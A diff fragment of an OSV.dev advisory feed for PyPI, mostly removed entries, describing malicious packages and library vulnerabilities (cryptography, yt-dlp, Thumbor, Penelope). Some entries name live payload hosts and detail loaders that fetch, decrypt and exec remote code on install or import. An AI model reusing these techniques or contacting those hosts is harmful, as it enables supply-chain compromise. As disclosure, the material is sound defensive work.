-The package&amp;#x27;s setup.py copies a telemetry.pth file into site-packages so every Python interpreter startup on the host auto-imports _telemetry_init, which spawns a daemon thread invoking _telemetry_transport.Client.initialize(). That client selects a platform-keyed asset path (/pkg/package, /pkg/package-arm64, /pkg/loader_mac, /pkg/package.exe) from a list of anonymous Cloudflare Workers mirrors (package-proxy.cf5oobworker.workers.dev, cf8oobworker/cf12oobworker/cf17-ddb/cf25-6eb.workers.dev), downloads the binary with no version pinning or hash verification, chmods it 0o755, and executes it (Windows uses ctypes.windll.kernel32 CreatePr…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/python-devplatform-client"&gt;https://bad-packages.kam193.eu/pypi/package/python-devplatform-client&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/06f1c2f0c66cf13ab6702414e8dce7c4115939f3e9cf95e9a8baade58961c016/detection"&gt;https://www.virustotal.com/gui/file/06f1c2f0c66cf13ab6702414e8dce7c4115939f3e9cf95e9a8baade58961c016/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/230f81f18608800912def92e18999874e004cd9fb4a554f759f77e4dd2030081/detection"&gt;https://www.virustotal.com/gui/file/230f81f18608800912def92e18999874e004cd9fb4a554f759f77e4dd2030081/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/c98444d6aebfd87f2f4412e1d7aafe8fe3fe080139ca1111049ea83fe828cd1d/detection"&gt;https://www.virustotal.com/gui/file/c98444d6aebfd87f2f4412e1d7aafe8fe3fe080139ca1111049ea83fe828cd1d/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/file/1360bb7437f5e7790747bc4e31eedcd19f88f23b20362a42368f4179b8b9e27d/detection"&gt;https://www.virustotal.com/gui/file/1360bb7437f5e7790747bc4e31eedcd19f88f23b20362a42368f4179b8b9e27d/detection&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://tria.ge/260720-teqmlshs6y/behavioral1"&gt;https://tria.ge/260720-teqmlshs6y/behavioral1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/python-devplatform-client/8.5.3/"&gt;https://pypi.org/project/python-devplatform-client/8.5.3/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/python-devplatform-client/8.5.4/"&gt;https://pypi.org/project/python-devplatform-client/8.5.4/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10916"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
     <title>[UPDATED] MAL-2026-10991: Malicious code in make-helper (PyPI)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-10991</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-10991"/>
@@ -358,20 +834,6 @@ _-= Per source details. Do not edit below this line.=-_
 
 ## Source: amazon-inspector (bb2e6560048133cc76a9e325b02b2719f89d59c500d09409bb10b6f4afb14401)
 On `import dev_helper`, the package&amp;#x27;s __init__.py starts a daemon thread that runs decryptor.decrypt_and_run(): it fetches an AES-GCM key from the hardcoded endpoint https://key-2qfm.vercel.app/api/key, decrypts the shipped dev_helper/encrypted.bin (16.9 KB ciphertext, nonce prepended), and executes the plaintext via exec(plaintext, {&amp;#x27;__name__&amp;#x27;: &amp;#x27;__main__&amp;#x27;}). The auto-start is gated to skip interactive Python sessions and PYTHONSTARTUP contexts, so the payload fires in CI and production imports but stays hidden from REPL inspection. Logging is disabled (logging.disable(logging.CRITICAL)) and errors are swallowed. The package&amp;#x27;s stated p…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/make-helper"&gt;https://bad-packages.kam193.eu/pypi/package/make-helper&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/make-helper/0.1.0/"&gt;https://pypi.org/project/make-helper/0.1.0/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/make-helper/0.1.1/"&gt;https://pypi.org/project/make-helper/0.1.1/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-10991"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] MAL-2026-11520: Malicious code in psbt-utils (PyPI)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-11520</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-11520"/>
-    <published>2026-08-04T10:03:35Z</published>
-    <updated>2026-08-04T22:05:26Z</updated>
-    <category term="PyPI"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in psbt-utils (PyPI)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;psbt-utils&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
----
-_-= Per source details. Do not edit below this line.=-_
-
-## Source: amazon-inspector (40293a9b1851f25decc83d08f82fab01f1f373d95e13dc937575b7182d470720)
-psbt-utils presents itself as a PSBT/Bitcoin wallet signing library handling WIF and hex private keys. update.py contains a _fetch_and_decrypt loader that retrieves an encrypted blob from https://curly-violet-87a9.ricardorichp.workers.dev/firmware, AES-256-GCM decrypts it with a key derived by SHA-256 of a hardcoded string (&amp;#x27;BIP-0174 PSBT... RFC 2024 draft&amp;#x27;), and passes the decrypted plaintext to exec() in a fresh namespace. The exec&amp;#x27;d code defines TelemetrySender.load and TelemetrySender.send, which are bound as _real_load/_real_send and reached through the package&amp;#x27;s top-level TelemetrySender exports. Execution is gated by an _is_real…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://bad-packages.kam193.eu/pypi/package/psbt-utils"&gt;https://bad-packages.kam193.eu/pypi/package/psbt-utils&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/psbt-utils/1.0.0/"&gt;https://pypi.org/project/psbt-utils/1.0.0/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-11520"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[UPDATED] MAL-2026-11050: Malicious code in discordnv (PyPI)</title>
@@ -1139,23 +1601,6 @@ Sink: `src/datamodel_code_generator/parser/jsonschema.py`, `_get_python_type_ove
 Any plugin that authenticates to a host with a non-standard auth header and follows that host&amp;#x27;s redirects can be coerced into sending the…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/Linuxfabrik/monitoring-plugins/security/advisories/GHSA-4jc5-g844-4x33"&gt;https://github.com/Linuxfabrik/monitoring-plugins/security/advisories/GHSA-4jc5-g844-4x33&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67435"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-67435&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/Linuxfabrik/lib/commit/6573ff9347e541200305d278d2663d2e54e052ff"&gt;https://github.com/Linuxfabrik/lib/commit/6573ff9347e541200305d278d2663d2e54e052ff&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/Linuxfabrik/lib/releases/tag/v6.0.0"&gt;https://github.com/Linuxfabrik/lib/releases/tag/v6.0.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/Linuxfabrik/monitoring-plugins"&gt;https://github.com/Linuxfabrik/monitoring-plugins&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-4jc5-g844-4x33"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] GHSA-jwv3-5hgf-82ww: python-cryptography: Duplicate self-signed intermediates can cause exponential path-building</title>
-    <id>https://osv.dev/vulnerability/GHSA-jwv3-5hgf-82ww</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-jwv3-5hgf-82ww"/>
-    <published>2026-08-03T21:26:50Z</published>
-    <updated>2026-08-04T14:41:07Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-69249"/>
-    <category term="PYSEC-2026-3553"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;python-cryptography: Duplicate self-signed intermediates can cause exponential path-building&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-69249, PYSEC-2026-3553&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cryptography&lt;/code&gt; — fixed in 49.0.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
-When resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack.
-
-This work was completed by Trail of Bits as part of the Patch The Planet project in collaboration with OpenAI. The finding was identified primarily by the Codex coding agent, and manually reviewed before submission. 
-
-### Details
-The core issue ari…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww"&gt;https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/pull/14960"&gt;https://github.com/pyca/cryptography/pull/14960&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582"&gt;https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography"&gt;https://github.com/pyca/cryptography&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-jwv3-5hgf-82ww"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
     <title>[UPDATED] GHSA-fg7f-2386-8897: Natural Language Toolkit (NLTK): ReDoS in NLTK ReviewsCorpusReader FEATURES regex</title>
     <id>https://osv.dev/vulnerability/GHSA-fg7f-2386-8897</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-fg7f-2386-8897"/>
@@ -1347,36 +1792,6 @@ The AWS Bedrock AgentCore Python SDK (bedrock-agentcore) provides tools for buil
 
 ### Impact
 Insufficient input validation in install_packages() allows specially crafted package specifiers to bypass validation and achieve arbitrary command execution within the sandbox. A remote authenticated user who can influence the arguments to install_packages() can execute arbitrary commands within the Code Interpreter sa…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/aws/bedrock-agentcore-sdk-python/security/advisories/GHSA-j6g5-3hh3-pgw8"&gt;https://github.com/aws/bedrock-agentcore-sdk-python/security/advisories/GHSA-j6g5-3hh3-pgw8&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-16796"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-16796&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/aws/bedrock-agentcore-sdk-python/pull/581"&gt;https://github.com/aws/bedrock-agentcore-sdk-python/pull/581&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/aws/bedrock-agentcore-sdk-python/commit/3c4b4ee6b8730e6313a82c743ac37dbcc1c21cdb"&gt;https://github.com/aws/bedrock-agentcore-sdk-python/commit/3c4b4ee6b8730e6313a82c743ac37dbcc1c21cdb&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://aws.amazon.com/security/security-bulletins/2026-065-aws"&gt;https://aws.amazon.com/security/security-bulletins/2026-065-aws&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/aws/bedrock-agentcore-sdk-python"&gt;https://github.com/aws/bedrock-agentcore-sdk-python&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/bedrock-agentcore/1.18.1"&gt;https://pypi.org/project/bedrock-agentcore/1.18.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-j6g5-3hh3-pgw8"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] GHSA-m2h6-j472-rp4c: python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees</title>
-    <id>https://osv.dev/vulnerability/GHSA-m2h6-j472-rp4c</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-m2h6-j472-rp4c"/>
-    <published>2026-08-03T21:26:57Z</published>
-    <updated>2026-08-04T14:41:02Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-69248"/>
-    <category term="PYSEC-2026-3554"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-69248, PYSEC-2026-3554&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:P&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;cryptography&lt;/code&gt; — fixed in 49.0.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
-If an intermediate constrained CA permits the DNS name `foo.example.com`, and the leaf certificate has a wildcard in its DNS SAN of `*.example.com`, python-cryptography&amp;#x27;s verifier accepts which allows escaping outside of the permitted names.
-
-### PoC
-
-```
-#!/usr/bin/env python3
-&amp;quot;&amp;quot;&amp;quot;Standalone PoC: pyca&amp;#x27;s DNSConstraint::matches admits a too-broad wildcard SAN.
-
-Setup:
-  Sub-CA permitted constraint: dNSName = foo.example.com
-  Leaf SAN:                    dNSName = *.example.com
-Expected: rejection (RFC 5280 §4.2.1.10 + standard wildcard semantics).
-Observed: pyca accepts; further, asks server-verifier whether the leaf is
-authoritative for `bar.example.com` and pyca answers yes — a sub-CA scope
-escape.
-&amp;quot;&amp;quot;&amp;quot;
-import datetime
-from cryptography import x509
-from cryptography.x509.oid im…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c"&gt;https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/pull/14888"&gt;https://github.com/pyca/cryptography/pull/14888&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography/commit/4d035a4225965edeffd312079a510ef25fcfdcb2"&gt;https://github.com/pyca/cryptography/commit/4d035a4225965edeffd312079a510ef25fcfdcb2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/pyca/cryptography"&gt;https://github.com/pyca/cryptography&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-m2h6-j472-rp4c"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[UPDATED] GHSA-v833-3823-cmhp: OnionShare Receive mode writes uploaded files even when file uploads are disabled</title>
@@ -2280,321 +2695,5 @@ if not api_key:
     <category term="CVE-2026-10223"/>
     <category term="PYSEC-2026-3575"/>
     <content type="html">&lt;p&gt;&lt;strong&gt;hermes-agent has an Injection issue&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-10223, PYSEC-2026-3575&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L · CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:P&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;hermes-agent&lt;/code&gt; — fixed in 0.15.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;A weakness has been identified in NousResearch hermes-agent up to 2026.4.30. This affects the function _scan_memory_content of the file tools/memory_tool.py. This manipulation causes injection. The attack can be initiated remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10223"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-10223&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/NousResearch/hermes-agent/commit/0dee92df22bdc0cfbcad90ca954aa14916f018de"&gt;https://github.com/NousResearch/hermes-agent/commit/0dee92df22bdc0cfbcad90ca954aa14916f018de&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://gist.github.com/YLChen-007/a1fb77ad2488c545a35d0f66356ea7b4"&gt;https://gist.github.com/YLChen-007/a1fb77ad2488c545a35d0f66356ea7b4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/NousResearch/hermes-agent"&gt;https://github.com/NousResearch/hermes-agent&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://vuldb.com/cve/CVE-2026-10223"&gt;https://vuldb.com/cve/CVE-2026-10223&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://vuldb.com/submit/822021"&gt;https://vuldb.com/submit/822021&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://vuldb.com/vuln/367502"&gt;https://vuldb.com/vuln/367502&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://vuldb.com/vuln/367502/cti"&gt;https://vuldb.com/vuln/367502/cti&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-33qv-c5qm-799v"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3622: yt-dlp: Downstream command injection via improper sanitization of yt-dlp --write-link output</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3622</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3622"/>
-    <published>2026-08-04T11:34:43Z</published>
-    <updated>2026-08-04T14:30:31Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-55404"/>
-    <category term="GHSA-6v4j-43gg-vj32"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;yt-dlp: Downstream command injection via improper sanitization of yt-dlp --write-link output&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55404, GHSA-6v4j-43gg-vj32&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;yt-dlp&lt;/code&gt; — fixed in 2026.7.4&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
-If the `--write-link`, `--write-url-link` or `--write-desktop-link` options are used with yt-dlp, it may produce output that can lead to downstream remote code execution. An attacker can craft a malicious metadata payload to achieve arbitrary command injection in the `.url` and `.desktop` shortcut files written by yt-dlp. This allows for malicious shell commands or malicious remote executables to run on the user&amp;#x27;s system if the user executes the generated `.url` or `.desktop` files.
-
-### Details
-The expected result of yt-dlp&amp;#x27;s `--write-link`, `--write-url-link` and `--write-desktop-link` options is to write a shortcut file that points to the webpage URL for the content downloaded by yt-dlp. The `--write-url-link` option writes a `.url` shortcut file for Windows, the `--write-de…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-6v4j-43gg-vj32"&gt;https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-6v4j-43gg-vj32&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55404"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-55404&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/commit/6fc85f617a5850307fd5b258477070e6ee177796"&gt;https://github.com/yt-dlp/yt-dlp/commit/6fc85f617a5850307fd5b258477070e6ee177796&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/commit/b6590aaa1e3808155d69c9a79a797ae484163789"&gt;https://github.com/yt-dlp/yt-dlp/commit/b6590aaa1e3808155d69c9a79a797ae484163789&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp"&gt;https://github.com/yt-dlp/yt-dlp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2026.07.04.221833"&gt;https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2026.07.04.221833&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/yt-dlp/yt-dlp/releases/tag/2026.07.04"&gt;https://github.com/yt-dlp/yt-dlp/releases/tag/2026.07.04&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/yt-dlp"&gt;https://pypi.org/project/yt-dlp&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3622"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3606: Penelope unsafe tar extraction allows arbitrary local file write via crafted session archive</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3606</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3606"/>
-    <published>2026-08-04T11:34:44Z</published>
-    <updated>2026-08-04T14:30:31Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-50558"/>
-    <category term="GHSA-f42x-p2mx-hm8r"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Penelope unsafe tar extraction allows arbitrary local file write via crafted session archive&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-50558, GHSA-f42x-p2mx-hm8r&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;penelope-shell-handler&lt;/code&gt; — fixed in 0.20.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
-
-Penelope versions prior to 0.19.3 extracted tar archives received from remote sessions without validating archive member paths. When using the affected Unix download path, a malicious or compromised remote session could return a crafted tar archive containing path traversal entries, such as `../`, causing files to be written outside the intended download directory on the Penelope operator&amp;#x27;s machine.
-
-The impact is limited to files writable by the user running Penelope. In some cases, this arbitrary file write could be chained to operator-side code execution if the attacker can overwrite a file that Penelope or the user later executes, such as `~/.penelope/peneloperc`. The issue has been fixed in version 0.19.3 by rejecting unsafe archive paths during extraction.
-
-### Affected …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/brightio/penelope/security/advisories/GHSA-f42x-p2mx-hm8r"&gt;https://github.com/brightio/penelope/security/advisories/GHSA-f42x-p2mx-hm8r&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/brightio/penelope/commit/a040afb5db32c7e80b5e8a2f9b2164cf911cfa62"&gt;https://github.com/brightio/penelope/commit/a040afb5db32c7e80b5e8a2f9b2164cf911cfa62&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/brightio/penelope"&gt;https://github.com/brightio/penelope&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/brightio/penelope/releases/tag/v0.20.0"&gt;https://github.com/brightio/penelope/releases/tag/v0.20.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/penelope-shell-handler"&gt;https://pypi.org/project/penelope-shell-handler&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-f42x-p2mx-hm8r"&gt;https://github.com/advisories/GHSA-f42x-p2mx-hm8r&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50558"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-50558&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/PYSEC-2026-3606"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] PYSEC-2026-3617: Thumbor treats ALLOWED_SOURCES string patterns as unescaped regex, allowing hostname bypass via wildcard dot</title>
-    <id>https://osv.dev/vulnerability/PYSEC-2026-3617</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/PYSEC-2026-3617"/>
-    <published>2026-08-04T11:34:46Z</published>
-    <updated>2026-08-04T14:30:30Z</updated>
-    <category term="PyPI"/>
-    <category term="CVE-2026-53500"/>
-    <category term="GHSA-6x26-6r6f-m537"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Thumbor treats ALLOWED_SOURCES string patterns as unescaped regex, allowing hostname bypass via wildcard dot&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-53500, GHSA-6x26-6r6f-m537&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;thumbor&lt;/code&gt; — fixed in 7.8.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
-
-The `ALLOWED_SOURCES` configuration is meant to restrict which hosts Thumbor&amp;#x27;s HTTP loader may fetch images from. Plain-string entries in that list (the overwhelming majority of real-world and documented configurations) are passed directly to `re.match()` without escaping. Because `.` is a regex wildcard, every dot in a domain name becomes a bypass vector: `s.glbimg.com` silently matches `sXglbimgYcom`, `sAglbimg.com`, and any other hostname that differs only at a dot position. This undermines the primary SSRF defence that `ALLOWED_SOURCES` is intended to provide.
-
-## Affected component
-
-`thumbor/loaders/http_loader.py` — `validate()`
-
-## Proof of concept
-
-```python
-import re
-from thumbor.config import Config
-from thumbor.context import Context
-from thumbor.loaders import http_…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/thumbor/thumbor/security/advisories/GHSA-6x26-6r6f-m537"&gt;https://github.com/thumbor/thumbor/security/advisories/GHSA-6x26-6r6f-m537&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/thumbor/thumbor/commit/68876715350c6c8f49c324e5515e64908830aed7"&gt;https://github.com/thumbor/thumbor/commit/68876715350c6c8f49c324e5515e64908830aed7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/thumbor/thumbor"&gt;https://github.com/thumbor/thumbor&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/thumbor/thumbor/releases/tag/7.8.0"&gt;https://github.com/thumbor/thumbor/releases/tag/7.8.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://pypi.org/project/thumbor"&gt;https://pypi.org/project/thumbor&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-6x26-6r6f-m537"&gt;https://github.com/advisories/GHSA-6x26-6r6f-m537&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a 